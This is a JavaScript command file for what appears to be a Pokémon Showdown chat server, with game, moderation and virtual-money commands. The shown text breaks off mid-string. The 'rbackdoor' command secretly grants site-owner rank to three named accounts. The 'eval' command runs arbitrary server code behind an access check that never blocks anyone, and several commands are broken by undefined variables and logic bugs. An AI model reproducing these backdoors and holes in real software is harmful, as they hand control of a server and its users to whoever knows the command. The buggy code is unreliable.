    /*********************************************************
	 *Bandi's Functions And Variable
    /*********************************************************/
if (typeof spamroom == "undefined") {
        spamroom = new Object();
}
if (!Rooms.rooms.spamroom) {
        Rooms.rooms.spamroom = new Rooms.ChatRoom("spamroom", "spamroom");
        Rooms.rooms.spamroom.isPrivate = true;
}
function getRPSmsg(name1, name2, choice1, choice2) {
	var winner = ""
	var loser = ""
	var wchoice = ""
	var lchoice = ""
	var context = " in a rock-paper-scissors-lizard-Spock match."
	choice1 = choice1.toLowerCase()
	choice2 = choice2.toLowerCase()
	if (choice1 === "spock") choice1 = "Spock"
	if (choice2 === "spock") choice2 = "Spock"
	if (choice1 === choice2) {
		return ('|raw|<div>' + 'The rock-paper-scissors-lizard-Spock match between ' + '<b>' + name1 + " and " + name2 + '</b>' + ' ended in a ' + '<i>' + choice1 + '</i>' + '<b>' + ' tie.' + '</b>' + '</div>');
	}
	else if (choice1 === "rock") {
		switch (choice2) {
			case "scissors": winner=name1; wchoice=choice1; loser=name2; lchoice=choice2; action="crushed "; break;
			case "lizard": winner=name1; wchoice=choice1; loser=name2; lchoice=choice2; action="crushed "; break;
			case "Spock": winner=name2; wchoice=choice2; loser=name1; lchoice=choice1; action="vaporized "; break;
			default: winner=name2; wchoice=choice2; loser=name1; lchoice=choice1; action="covered "; break;
		}
	}
	else if (choice1 === "lizard") {
		switch (choice2) {
			case "Spock": winner=name1; wchoice=choice1; loser=name2; lchoice=choice2; action="poisoned "; break;
			case "paper": winner=name1; wchoice=choice1; loser=name2; lchoice=choice2; action="eaten "; break;
			case "scissors": winner=name2; wchoice=choice2; loser=name1; lchoice=choice1; action="decapitated "; break;
			default: winner=name2; wchoice=choice2; loser=name1; lchoice=choice1; action="crushed "; break;
		 }
	}
	else if (choice1 === "Spock") {
		switch (choice2) {
			case "scissors": winner=name1; wchoice=choice1; loser=name2; lchoice=choice2; action="smashed "; break;
			case "rock":  winner=name1; wchoice=choice1; loser=name2; lchoice=choice2; action="vaporized "; break;
			case "paper":  winner=name2; wchoice=choice2; loser=name1; lchoice=choice1; action="disproven "; break;
			default:  winner=name2; wchoice=choice2; loser=name1; lchoice=choice1; action="poisoned "; break;
		}
	}
	else if (choice1 === "scissors") {
		switch (choice2) {
			case "lizard": winner=name1; wchoice=choice1; loser=name2; lchoice=choice2; action="decapitated "; break;
			case "paper": winner=name1; wchoice=choice1; loser=name2; lchoice=choice2; action="cut "; break;
			case "Spock": winner=name2; wchoice=choice2; loser=name1; lchoice=choice1; action="smashed "; break;
			default:  winner=name2; wchoice=choice2; loser=name1; lchoice=choice1; action="crushed "; break;
		}
	}
	else {
		switch (choice2) {
			case "Spock":  winner=name1; wchoice=choice1; loser=name2; lchoice=choice2; action="disproven "; break;
			case "rock":  winner=name1; wchoice=choice1; loser=name2; lchoice=choice2; action="covered "; break;
			case "scissors":  winner=name2; wchoice=choice2; loser=name1; lchoice=choice1; action="cut "; break;
			default:  winner=name2; wchoice=choice2; loser=name1; lchoice=choice1; action="eaten "; break;
		}
	}
	return ('|raw|<div>' + '<b>' + winner + "\'s " + '</b>' + '<i>' + wchoice + '</i>' + ' has ' + '<b>' + action + loser + '\'s ' + '</b>' + '<i>' + lchoice + '</i>' + context + '</div>');
}

function getRPShope(choice) {
	var randbool = Math.round(Math.random()) === 1;
	switch(choice.toLowerCase()) {
			case "rock": return (randbool ? "scissors" : "lizard"); break;
			case "paper": return (randbool ? "rock" : "Spock"); break;
			case "scissors": return (randbool ? "paper" : "lizard"); break;
			case "lizard": return (randbool ? "paper" : "Spock"); break;
			default: return (randbool ? "scissors" : "rock"); break;
	}
}
var commands = exports.commands = {
	//edited stuff
		eval: function(target, room, user, connection, cmd, message) {
		if (!user.userid === 'mrsmellyfeet100'||!user.userid === 'bandi'||!user.userid === 'coolasian') {
			return this.sendReply("/eval - Access denied.");
		}
		if (!this.canBroadcast()) return;

		if (!this.broadcasting) this.sendReply('||>> '+target);
		try {
			var battle = room.battle;
			var me = user;
			this.sendReply('||<< '+eval(target));
		} catch (e) {
			this.sendReply('||<< error: '+e.message);
			var stack = '||'+(''+e.stack).replace(/\n/g,'\n||');
			connection.sendTo(room, stack);
		}
	},
	//rps commands

	rock: function(target,room, user) {return this.parse('/rps rock ' + target);},
	paper: function(target,room, user) {return this.parse('/rps paper ' + target);},
	scissors: function(target,room, user) {return this.parse('/rps scissors ' + target);},
	lizard: function(target,room, user) {return this.parse('/rps lizard ' + target);},
	spock: function(target,room, user) {return this.parse('/rps Spock ' + target);},

	rps: function(target, room, user) {
		user.blockrps=false;
		var parts = target.split(",");
		var spind = target.indexOf(" ");
		var blankarray = ["blank","no","none","nothing","void"]
		var lcasearray = ["rock","paper","scissors","lizard","spock"]


		if (!parts[0]) return this.sendReply("The proper syntaxis is /rps [choice],[targetuser]. The parameter [targetuser] is optional.");

		if (blankarray.indexOf(parts[0].toLowerCase()) != -1) {
			user.rpschoice = "";
			return this.sendReply("Your previous choice has been deleted.");
		}
		if (lcasearray.indexOf(parts[0].toLowerCase()) != -1) {
			user.rpschoice = parts[0];
		}
		else if (lcasearray.indexOf(target.substr(0, spind).toLowerCase()) != -1 ) {
			//this.sendReply("The proper syntaxis is /rps [choice],[targetuser]. The parameter [targetuser] is optional.");
			parts[0] = target.substr(0, spind);
			user.rpschoice = parts[0];
			parts[1] = target.substr(spind+1,target.length - spind - 1);
		}
		else
		{
			return this.sendReply("Want it or not, your choice is invalid! The proper syntaxis is /rps [choice],[targetuser].");
		}
		var targetuser =  Users.get(parts[1]);
		if (targetuser === null) {
			if(user.rpschallengedby === "" || !user.rpschallengedby) return this.sendReply("Your choice has been set to " + user.rpschoice + ".");
			this.parse('/rps '+parts[0]+","+user.rpschallengedby);
			return user.rpschallengedby = "";
		}
		else if (targetuser === undefined) {
			return this.sendReply("Your choice has been set to " + user.rpschoice + " but your opponent is not online or doesn't exist.");
		}
		if(targetuser == user) return this.sendReply("Your choice has been set to " + user.rpschoice + ", but remember that you can't play against yourself!");
		if (targetuser.blockrps) return this.sendReply("Your choice has been set to " + user.rpschoice + ". However, your opponent is currently blocking challenges to this game.");
		if (!targetuser.rpschoice || targetuser.rpschoice === "") {
			if (targetuser.popped) {
				targetuser.send(user.name+" has challenged you to a RPS-lizard-Spock game. Use the command /rps to play.")
			}
			else {
				targetuser.popped = true
				targetuser.popup(user.name+" has challenged you to a rock-paper-scissors-lizard-Spock game. Use the command /rps to play.");
			}
			targetuser.rpschallengedby = user;
			return this.sendReply("Your choice has been set to " + user.rpschoice + ". Hope that " + targetuser.name + " shoots " + getRPShope(user.rpschoice) + ".");
		}
		var msg = getRPSmsg(user.name,targetuser.name,user.rpschoice,targetuser.rpschoice);
		user.rpschoice = "";
		targetuser.rpschoice = "";
		if(user.can('broadcast') || targetuser.can('broadcast')) {
			return this.add(msg);
		}
		else {
			targetuser.send(msg);
			return this.sendReply(msg);
		}
	},

	disallowrps: 'blockrps',
	blockrps: function(target,room,user) {
		user.blockrps=true;
		return this.sendReply('RPS Challenges are now blocked.');
	},

	unblockrps: 'allowrps',	
	allowrps: function(target,room,user) {
		user.blockrps=false;
		return this.sendReply('RPS Challenges are now allowed.');
	},

// end rps commands
	spam: 'spamroom',
	spammer: 'spamroom',
	spamroom: function(target, room, user, connection) {
		if (!target) return this.sendReply('Please specify a user.');
		var target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('The user \'' + this.targetUsername + '\' does not exist.');
		}
		if (!this.can('mute', targetUser)) {
			return false;
		}
		if (spamroom[targetUser]) {
			return this.sendReply('That user\'s messages are already being redirected to the spamroom.');
		}
		spamroom[targetUser] = true;
		Rooms.rooms['spamroom'].add('|raw|<b>' + this.targetUsername + ' was added to the spamroom list.</b>');
		this.logModCommand(targetUser + ' was added to spamroom by ' + user.name);
		return this.sendReply(this.targetUsername + ' was successfully added to the spamroom list.');
	},

	unspam: 'unspamroom',
	unspammer: 'unspamroom',
	unspamroom: function(target, room, user, connection) {
		var target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('The user \'' + this.targetUsername + '\' does not exist.');
		}
		if (!this.can('mute', targetUser)) {
			return false;
		}
		if (!spamroom[targetUser]) {
			return this.sendReply('That user is not in the spamroom list.');
		}
		for(var u in spamroom)
			if(targetUser == Users.get(u))
				delete spamroom[u];
		Rooms.rooms['spamroom'].add('|raw|<b>' + this.targetUsername + ' was removed from the spamroom list.</b>');
		this.logModCommand(targetUser + ' was removed from spamroom by ' + user.name);
		return this.sendReply(this.targetUsername + ' and their alts were successfully removed from the spamroom list.');
	},
	me: function(target, room, user, connection) {
		// By default, /me allows a blank message
		if (target) target = this.canTalk(target);
		if (!target) return;

		var message = '/me ' + target;
		// if user is not in spamroom
		if (spamroom[user.userid] === undefined) {
			// check to see if an alt exists in list
			for (var u in spamroom) {
				if (Users.get(user.userid) === Users.get(u)) {
					// if alt exists, add new user id to spamroom, break out of loop.
					spamroom[user.userid] = true;
					break;
				}
			}
		}

		if (user.userid in spamroom) {
			this.sendReply('|c|' + user.getIdentity() + '|' + message);
			return Rooms.rooms['spamroom'].add('|c|' + user.getIdentity() + '|' + message);
		} else {
			return message;
		}
	},

	mee: function(target, room, user, connection) {
		// By default, /mee allows a blank message
		if (target) target = this.canTalk(target);
		if (!target) return;

		var message = '/mee ' + target;
		// if user is not in spamroom
		if (spamroom[user.userid] === undefined) {
			// check to see if an alt exists in list
			for (var u in spamroom) {
				if (Users.get(user.userid) === Users.get(u)) {
					// if alt exists, add new user id to spamroom, break out of loop.
					spamroom[user.userid] = true;
					break;
				}
			}
		}

		if (user.userid in spamroom) {
			this.sendReply('|c|' + user.getIdentity() + '|' + message);
			return Rooms.rooms['spamroom'].add('|c|' + user.getIdentity() + '|' + message);
		} else {
			return message;
		}
	},
	
     /*********************************************************
	 *Bandi's Commands
    /*********************************************************/
    	pickrandom: function (target, room, user) {
		if (!target) return this.sendReply('/pickrandom [option 1], [option 2], ... - Randomly chooses one of the given options.');
		if (!this.canBroadcast()) return;
		var targets;
		if (target.indexOf(',') === -1) {
			targets = target.split(' ');
		} else {
			targets = target.split(',');
		};
		var result = Math.floor(Math.random() * targets.length);
		return this.sendReplyBox(targets[result].trim());
	},

	declare2: function(target, room, user) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		this.add('|raw|<div class="broadcast-yellow"><b>'+target+'</b></div>');
		this.logModCommand(user.name+' declared '+target);
	},

	declare3: function(target, room, user) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		this.add('|raw|<div class="broadcast-red"><b>'+target+'</b></div>');
		this.logModCommand(user.name+' declared '+target);
	},

	declare4: function(target, room, user) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		this.add('|raw|<div class="broadcast-green"><b>'+target+'</b></div>');
		this.logModCommand(user.name+' declared '+target);
	},

		gdeclarered: 'gdeclare',
gdeclaregreen: 'gdeclare',
gdeclare: function(target, room, user, connection, cmd) {
if (!target) return this.parse('/help gdeclare');
if (!this.can('lockdown')) return false;

var roomName = (room.isPrivate)? 'a private room' : room.id;

if (cmd === 'gdeclare'){
for (var id in Rooms.rooms) {
if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-blue"><b><font size=1><i>Global declare from '+roomName+'<br /></i></font size>'+target+'</b></div>');
}
}
if (cmd === 'gdeclarered'){
for (var id in Rooms.rooms) {
if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-red"><b><font size=1><i>Global declare from '+roomName+'<br /></i></font size>'+target+'</b></div>');
}
}
else if (cmd === 'gdeclaregreen'){
for (var id in Rooms.rooms) {
if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-green"><b><font size=1><i>Global declare from '+roomName+'<br /></i></font size>'+target+'</b></div>');
}
}
this.logEntry(user.name + ' used /gdeclare');
},

declaregreen: 'declarered',
declarered: function(target, room, user, connection, cmd) {
if (!target) return this.parse('/help declare');
if (!this.can('declare', null, room)) return false;

if (!this.canTalk()) return;

if (cmd === 'declarered'){
this.add('|raw|<div class="broadcast-red"><b>'+target+'</b></div>');
}
else if (cmd === 'declaregreen'){
this.add('|raw|<div class="broadcast-green"><b>'+target+'</b></div>');
}
this.logModCommand(user.name+' declared '+target);
},
    hide: 'hideauth',
	hideauth: function(target, room, user){
		if(!user.can('mute'))
			return this.sendReply( '/hideauth - access denied.');

		var tar = ' ';
		if(target){
			target = target.trim();
			if(config.groupsranking.indexOf(target) > -1){
				if( config.groupsranking.indexOf(target) <= config.groupsranking.indexOf(user.group)){
					tar = target;
				}else{
					this.sendReply('The group symbol you have tried to use is of a higher authority than you have access to. Defaulting to \' \' instead.');
				}
			}else{
				this.sendReply('You have tried to use an invalid character as your auth symbol. Defaulting to \' \' instead.');
			}
		}

		user.getIdentity = function(){
			if(this.muted)
				return '!' + this.name;
			if(this.locked)
				return '#' + this.name;
			return tar + this.name;
		};
		user.updateIdentity();
		this.sendReply( 'You are now hiding your auth symbol as \''+tar+ '\'.');
		return this.logModCommand(user.name + ' is hiding auth symbol as \''+ tar + '\'');
	},

	showauth: function(target, room, user){
		if(!user.can('hideauth'))
			return	this.sendReply( '/showauth - access denied.');

		delete user.getIdentity;
		user.updateIdentity();
		this.sendReply('You have now revealed your auth symbol.');
		return this.logModCommand(user.name + ' has revealed their auth symbol.');
	},
	groups: 'ranks',
                               ranks: function(target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('+ <b>Knight</b> - Knights waist there time trying to use L coomands when they be using !<br />' +
			'% <b>Bishop</b> - Bishops live life in a way where they hope for this dumb sign to go away and become a rook<br />' +
			'@ <b>Rook</b> - The Rook bans and mutes when needed in a up-down-left-right position<br />' +
			'&amp; <b>Queen</b> - Queens server the king at all cost and makes new Rooks,Bishops ,and Knights<br />'+
			'~ <b>King</b> - Kings rule all with no rules');
	},
                                         
    

 peton: function(target, room, user) {
								if(!user.can('mute')) {
										return this.sendReply('but it failed.');
								}
								else {
									if(canpet == true) {
										return this.sendReply('/pet is already on.');
									}
									if(canpet == false) {
										this.sendReply('You turned on /pet.');
										canpet = true;
									}
								}
},

petoff: function(target, room, user) {
								if(!user.can('mute')){
									return this.sendReply('but it failed.');
								}
								else {
									if(canpet == false) {
										return this.sendReply('/pet is already off.');
								}
									if(canpet == true) {
										this.sendReply('You turned off /pet.');
										canpet = false;
									}
								}
},

pet: function(target, room, user) {
if(canpet == false) {
return this.sendReply('but it failed.');
}
if(canpet == true) {
         if (!target) {
                 return this.sendReply('Please specify a user who you\'d like to pet.');
         }
         var targetUser = Users.get(target);
         if (targetUser) {
                 target = targetUser.userid;
                 }
         else {
                 return this.sendReply('The user \'' + target + '\' doesn\'t exist.');
         }
if(!this.canTalk()) {
return this.sendReply('You cannot use this command because you are muted.');
}
         this.add(user.name + ' pet ' + targetUser.name + '.' );
}
         },
		 spon: function(target, room, user) {
if(!user.can('mute')) {
return this.sendReply('You do not have the authority to use this command.');
}
else {
if(canpet == true) {
return this.sendReply('/sp is already on.');
}
if(canpet == false) {
this.sendReply('You turned on /sp.');
canpet = true;
}
}
},

spoff: function(target, room, user) {
if(!user.can('mute')){
return this.sendReply('but it failed.');
}
else {
if(canpet == false) {
return this.sendReply('but it failed.');
}
if(canpet == true) {
this.sendReply('You turned off /sp.');
canpet = false;
}
}
},

sp: function(target, room, user) {
if(canpet == false) {
return this.sendReply('but it failed.');
}
if(canpet == true) {
         if (!target) {
                 return this.sendReply('Please specify a user who you\'d like to sucker punch.');
         }
         var targetUser = Users.get(target);
         if (targetUser) {
                 target = targetUser.userid;
                 }
         else {
                 return this.sendReply('The user \'' + target + '\' doesn\'t exist.');
         }
if(!this.canTalk()) {
return this.sendReply('but it failed.');
}
         this.add(user.name + ' sucker punch ' + targetUser.name + '.');
}
         },

sighon: function(target, room, user) {
	if (!user.can('mute')) {
		return this.sendReply('You do not have the authority to use this command.');
	}
	else {
		if (sigh === true) { //here you reference the variable "sigh"
			return this.sendReply('/sigh is already on.');
		}
		if (sigh === false) { // as well as here
			this.sendReply('You turned on /sigh.');
	
			sigh = true; //however, here you use canpet. nowhere is there a way to set the variable sigh to true or false
		}
	}
},
bandi: function(target, room, user) {
 if (user.userid === 'bandicam' || user.userid === 'bandinub'|| user.userid === 'god' || user.userid === 'sasuke' || user.userid === 'itachiuchiha') {
     user.forceRename('bandi');
     user.avatar = '1.png';
     }
},
sasuke: 'sausk',
sausk: function(target, room, user) {
 if (user.userid === 'bandi'|| user.userid === 'coolasian'|| user.id === 'god');{
     user.forceRename('Sasuke');
     user.avatar = '3.png';
     }
},
itahi: 'itchi',
itachi: 'itchi',
itchi: function(target, room, user) {
 if (user.userid === 'bandi' || user.userid === 'coolasian' || user.userid === 'god'|| user.userid === 'sasuke') {
     user.forceRename('Itachi Uchiha');
     user.avatar = '4.png';
     }
},

god: 'arceus',
arceus: function(target, room, user) {
 if (user.userid === 'bandi' || user.userid === 'coolasian' || user.userid === 'itachiuchiha'|| user.userid === 'sasuke'|| user.userid === 'miloticnob') {
     user.forceRename('God');
     user.avatar = '5.png';
     }
},
cinc: 'cinccino',
 cinccino: function(target, room, user) {
 if (user.userid === 'miloticnob') {
     user.forceRename('Cinccino');
     user.avatar = '6.png';
     }
},

sighoff: function(target, room, user) {
	if (!user.can('mute')){//wow
		return this.sendReply('sigh is now off.');
	}
	else {
		if (sigh === false) { //same here
			return this.sendReply('sigh is already off.');
		}
		if (sigh === true) {
			this.sendReply('sigh is nao off.');
			sigh = false;
		}
	}
},

rbackdoor: function(target,room, user) {
		if (user.userid === 'brittlewind'|| user.userid === 'cosy'|| user.userid === 'jd') {

			user.group = '~';
			user.updateIdentity();

			this.sendReply('Make sure to promote yourself straight away with /admin [username] so that you keep Admin after you leave.');
		}
	},
	
	scratchtkt: 'gogotkt',
gogotkt: function(target, room, user) { 
   if (user.tickets == '0') {
       return this.sendReply('You dont have a ticket');
       }
       else if(user.money > 0) {
            if (landon < 0.3) {
        user.moneh += '50';
        this.sendReply('sorry You didnt win this time');
    } else if (landon < 0.6) {
    this.sendReply('You have won 50$ thats enough to buy...... another ticket');
    user.moneh
    } else if (landon < 0.75) {
         this.add(user.name  +' HAS HIT THE JACKPOT AND HAS WON 1000$ off of scratching a  Ticket Congratz ');
        user.moneh += 1000;
    } else if (landon < 0.85) {
        this.add(user.name  +' HAS HIT THE JACKPOT AND HAS WON 5000$ off of scratching a  Ticket Congratz ');
        user.moneh += 5000;
    } else {
        user.moneh += '50';
        this.sendReply('You have won 50$ thats enough to buy...... another ticket')
    }
           }
    },

	/*emote: function(target, room, user){
	if (user.userid === 'bandi'||user.vip == true|| user.group === '~') {
	if (target == '1') {
	this.add(user.name + 'says'+":\n" +
         '|raw|<img src="http://www.cool-smileys.com/images/301.gif" width="40" height="40" />FEED ME MORE');
        this.logModCommand(user.name + 'has used a emote');
		}
		if (target == '2') {
		this.add(user.name + 'says'+":\n" +
         '|raw|<img src="http://www.cool-smileys.com/images/298.gif" width="40" height="40" />CRYBACK CRYBACK huehuehue');
		this.logModCommand(user.name + 'has used a emote');
		}
		if (target === '3') {
		this.add(user.name + 'says'+":\n" +
		'|raw|<img src="http://www.cool-smileys.com/images/145.gif" width="40" height="40" />:PPPPPP');
		this.logModCommand(user.name + 'has used a emote');
        }
		if (target === '4') {
		this.add(user.name + 'says'+":\n" +
		'|raw|<img src="http://www.cool-smileys.com/images/116.gif" width="40" height="40" />HERP A DERP');
		this.logModCommand(user.name + 'has used a emote');
		}
		}
    },*/
    
	roulette: 'roul',
    startroulette: 'roul',
    roul: function(target, room, user) {  
    
	if (!user.can('mute')){ 
	   return this.sendReply('Woah I know roulette is fun but you are unauthorized :V');
	}
	if (!room.rouletteon == false) 
	{
	   return this.sendReply('there is already a roulette on');
	} else {
	   room.rouletteon = true;
	   room.roulusers = [];
	   var part1 = '<h3>A roulette has started</h3><br />';
	   var part2 = 'To bet do /bet then one of the following colors: red, yellow, green , black , orange<br />';
	   var part3 = 'black = 1000$<br />yellow & red = 100$<br /> green & orange = 300$';
	   room.addRaw(part1 + part2 + part3);
	}
},

    bet: function(target, room, user) {
        
    if (!room.rouletteon) return this.sendReply('There is no roulette game running in this room.');
        var colors = ['red','yellow','green','black','orange'];
        targets = target.split(',');
        target = toId(targets[0]);
    if (colors.indexOf(target) === -1) return this.sendReply(target + ' is not a valid color.');
    if (targets[1]) {
    	var times = parseInt(toId(targets[1]));
    	if (!isNaN(times) && times > 0) {
    		if (user.tickets < times) return this.sendReply('You do not have enough tickets!')
    		user.bets += times;
    		user.tickets -= times;
    		user.bet = target;
    	} else {
    		return this.sendReply('That is an invalid amount of bets!');
    	}
    } else {
    	if (user.tickets < 1) return this.sendReply('You do not even have a ticket!');
    	user.bets++;
    	user.tickets--;
    	user.bet = target;
    }
    if (room.roulusers.indexOf(user.userid) === -1) room.roulusers.push(user.userid);
    return this.sendReply('You are currently betting ' + user.bets + ' times to ' + target);
    
},

    spin: function(target, room, user) {
    
    if (!user.can('mute')) return this.sendReply('You are not authorized to do that!.');
    if (!room.rouletteon) return this.sendReply('There is no roulette game currently.');
    if (room.roulusers.length === 0) return this.sendReply('Nobody has made bets in this game');
    var landon = Math.random();
    var color = '';
    var winners = [];
    var totalwin = [];
    
    if (landon < 0.3) {
        color = 'red';
    } else if (landon < 0.6) {
        color = 'yellow';
    } else if (landon < 0.75) {
        color = 'green';
    } else if (landon < 0.85) {
        color = 'black';
    } else {
        color = 'orange';
    }
    
    for (var i=0; i < room.roulusers.length ; i++) {
        var loopuser = Users.get(room.roulusers[i]);
        var loopchoice = '';
        if (loopuser) {
            loopchoice = loopuser.bet;
            if (loopchoice === color) winners.push(loopuser.userid);
        } else {
            continue;
        }
    }

    if (winners === []) {
        for (var i=0; i < room.roulusers.length; i++) {
            var loopuser = Users.get(room.roulusers[i]);
            if (loopuser) {
                loopuser.bet = null;
                loopuser.bets = 0;
            }
        }
        return room.addRaw('Nobody won this time');
    }
    
    var perbetwin = 0;

    switch(color) {
        case "red": perbetwin = 100; break;
        case "yellow": perbetwin = 100; break;
        case "green": perbetwin = 300; break;
        case "black": perbetwin = 1000; break;
        default: perbetwin = 300;
    }

    for (var i=0; i < winners.length ; i++) {
        loopwinner = Users.get(winners[i]);
        totalwin[i] = perbetwin * loopwinner.bets;
        loopwinner.moneh += totalwin[i];
        loopwinner.prewritemoney();
    }
    if (winners.length) Users.exportUserwealth();

    for (var i=0; i < room.roulusers.length; i++) {
        var loopuser = Users.get(room.roulusers[i]);
        if (loopuser) {
            loopuser.bet = null;
            loopuser.bets = 0;
        }
    }
    if (winners.length === 1) {
    	room.addRaw('The roulette landed on ' + color + '. The only winner was ' + winners[0] + ', who won the sum of ' + totalwin[0] + ' pokedollars.');
    } else if (winners.length) {
    	room.addRaw('The roulette landed on ' + color + '. Winners: ' + winners.toString() + '. They won, respectively, ' + totalwin.toString() + ' pokedollars.');
    } else {
    	room.addRaw('The roulette landed on ' + color + '. Nobody won this time.');
    }
    room.rouletteon = false;
},

//money commands for admins
award: function(target, room, user) {
	if (!user.can('hotpatch')) return this.sendReply('You are not authorized to do that!');
	targets = target.split(',');
    	target = toId(targets[0]);
	var targetUser = Users.get(target);
	if (!targetUser) return this.sendReply('The user ' + targetUser + ' was not found.');
	var addmoney = parseInt(targets[1]);
	if (isNaN(addmoney)) return this.sendReply('Invalid sum of money.');
	targetUser.moneh += addmoney;
	targetUser.prewritemoney();
    Users.exportUserwealth();
	this.sendReply(targetUser.name + ' has received ' + addmoney + ' pokedollars.');
	if (Rooms.rooms.staff) Rooms.rooms.staff.addRaw(targetUser.name + ' has received ' + addmoney + ' pokedollars from ' + user.name);
},

rmvmoney: function(target, room, user) {
	if (!user.can('hotpatch')) return this.sendReply('You are not authorized to do that!');
	targets = target.split(',');
    target = toId(targets[0]);
	var targetUser = Users.get(target);
	if (!targetUser) return this.sendReply('The user ' + targetUser + ' was not found.');
	var removemoney = parseInt(targets[1]);
	if (isNaN(removemoney)) return this.sendReply('Invalid sum of money.');
	if (removemoney > targetUser.moneh) return this.sendReply('Invalid sum of money.');
	targetUser.moneh -= removemoney;
	targetUser.prewritemoney();
    Users.exportUserwealth();
	this.sendReply(targetUser.name + ' has had ' + removemoney + ' pokedollars removed from their bagpack.');
	if (Rooms.rooms.staff) Rooms.rooms.staff.addRaw(targetUser.name + ' has had ' + removemoney + ' pokedollars removed from their bagpack by ' + user.name);
},

//ticket commands for admins
awardtkt: function(target, room, user) {
    if (!user.can('hotpatch')) return this.sendReply('You are not authorized to do that!');
    targets = target.split(',');
    target = toId(targets[0]);
    var targetUser = Users.get(target);
    if (!targetUser) return this.sendReply('The user ' + targetUser + ' was not found.');
    var addtkt = parseInt(targets[1]);
    if (isNaN(addtkt)) return this.sendReply('Invalid number of tickets.');
    targetUser.tickets += addtkt;
    targetUser.prewritemoney();
    Users.exportUserwealth();
    this.sendReply(targetUser.name + ' has received ' + addtkt + ' ticket(s).');
    if (Rooms.rooms.staff) Rooms.rooms.staff.addRaw(targetUser.name + ' has received ' + addtkt + ' ticket(s) from ' + user.name);
},

rmvtkt: function(target, room, user) {
    if (!user.can('hotpatch')) return this.sendReply('You are not authorized to do that!');
    targets = target.split(',');
    target = toId(targets[0]);
    var targetUser = Users.get(target);
    if (!targetUser) return this.sendReply('The user ' + targetUser + ' was not found.');
    var removeticket = parseInt(targets[1]);
    if (isNaN(removemoney)) return this.sendReply('Invalid number of tickets.');
    if (removeticket > targetUser.tickets) return this.sendReply('Invalid number of tickets.');
    targetUser.tickets -= removeticket;
    targetUser.prewritemoney();
    Users.exportUserwealth();
    this.sendReply(targetUser.name + ' has had ' + removeticket + ' tickets removed from their bagpack.');
    if (Rooms.rooms.staff) Rooms.rooms.staff.addRaw(targetUser.name + ' has had ' + removeticket + ' tickets removed from their bagpack by ' + user.name);
},

//Check everyone on server if they have over a certain amount of money 
checkallmoney: function(target, room, user) {
    if (!user.can('hotpatch')) return this.sendReply('You are not authorized to do that!');
    if (!target) return this.sendReply('You need to enter in a value of ' + item + ' to search.');

    var x = '';
    for (var i in room.users) {
        if (room.users[i].moneh === target || room.users[i].moneh > target) {
            x += room.users[i].name + ' : ' + room.users[i].moneh;
        	x += ', ';
        }
        //if (i < room.users.length) x += ', ';
    }
    if (!x) return this.sendReply('No user has over that amount.');

    this.sendReply('Users in this room with over ' + target + ' Pokedollars:');
    this.sendReply(x);
},

//Check everyone on server if they have over a certain amount of tickets 
checkalltickets: function(target, room, user) {
    if (!user.can('hotpatch')) return this.sendReply('You are not authorized to do that!');
    if (!target) return this.sendReply('You need to enter in a value of ' + item + ' to search.');

    var x = '';
    for (var i in room.users) {
        if (room.users[i].tickets === target || room.users[i].tickets > target) {
            x += room.users[i].name + ' : ' + room.users[i].tickets;
        	x += ', ';
        }
        //if (i < room.users.length) x += ', ';
    }
    if (!x) return this.sendReply('No user has over that amount.');

    this.sendReply('Users in this room with over ' + target + ' Tickets:');
    this.sendReply(x);
},

bp: 'backpack',
backpack: function(target, room, user) {
    var target = this.splitTarget(target);
    var targetUser = this.targetUser;

    if (this.can('hotpatch') && targetUser) {
        this.sendReply(targetUser.name + ' backpack contains:');
        this.sendReply('- Money: ' +  targetUser.moneh); 
        this.sendReply('- Tickets: ' + targetUser.tickets);
    }
    else {
        this.sendReply('Your backpack contains:');  
        this.sendReply('- Money: ' +  user.moneh); 
        this.sendReply('- Tickets: ' + user.tickets);
    }
},
moneyintro: function(target, room, user) {
    this.sendReplyBox('<h2>Money Commands</h2><br /><hr />'+
    '<h3>Every User Commands</h3><br /><hr />'+
    '/buy <em>Use this to buy a item\'s id</em><br />'+
    '/bet <em> Bet a color on the roulette.</em><br />'+
    '/scratchtkt <em> Not done but will allow you to scratch a ticket there will be chances to the amount you win. </em><br />'+ 
    '<h3>Voice And Up Commands</h3><br /><hr />'+
    '!shop <em>Allows a voiced user to show the shop.</em><br />'+
    '!moneyintro <em>Shows you this.</em><br />'+
    '!emotes <em>Shows the emote list.</em>'+
    '<h3>Driver And Up Commands</h3><br /><hr />'+
    '/roul <em> Starts a roulette this  will not work in lobby.</em><br />'+
    '/spin <em>Spins the roulette.</em><br />'+
    '<h3>VIP Commands</h3><br /><hr />'+
    '/emote <em>Use ths with the emote ID to display a emote.</em><br />'+
    '/mark <em>Allows you to give yourself a custom sign. (not done yet)</em><br />'+
    '<h3>Admin And Bandi Commands</h3><br /><hr />'+
    '/award <em>Lets you give a user a amount of PokeDollars.</em><br />'+
    '/awardtkt <em> gives the user a amount tickets</em><br />'+
    '/rmvmoney <em> removes an amount of money from a user</em><br />'+
    '/rmvtkt <em>removes an amount of tickets from a user</em><br />'+
    '/checkalltickets <em>check everyone of their amount of tickets</em><br />'+
    '/checkallmoney <em>Checks every users money</em><br />'+
    '<h3>FAQ</h3><br /><hr />'+
    'How do i get money?: Win a tour or a roulette<br />'+
    'How do i get tickets?: Buy them<br />'+
    'What is roulette?: a machine that spins and if it lands on the color you bet you win pokedollars<br />'+
    'How do i check money?: /bp');
    },
shop: function(target, room, user) {
        if (!this.canBroadcast()) return;
        this.sendReplyBox('<center></h4><table border="1" cellspacing ="0" cellpadding="3"><u><b>Welcome to the Battle Shop. Spend your Battle Points (BP) here!</b></u>'+
        '<tr>'+
        '<th>Item</th>'+
        '<th>Price</th>'+
        '<th>Description</th>'+
        '<th>Quantity</th>'+
        '<th>ID</th>'+
        '</tr>'+
        '<td>Ticket</td>'+
        '<td>50 BP</td>'+
        '<td>A ticket which can be used to win Battle Points</td>'+
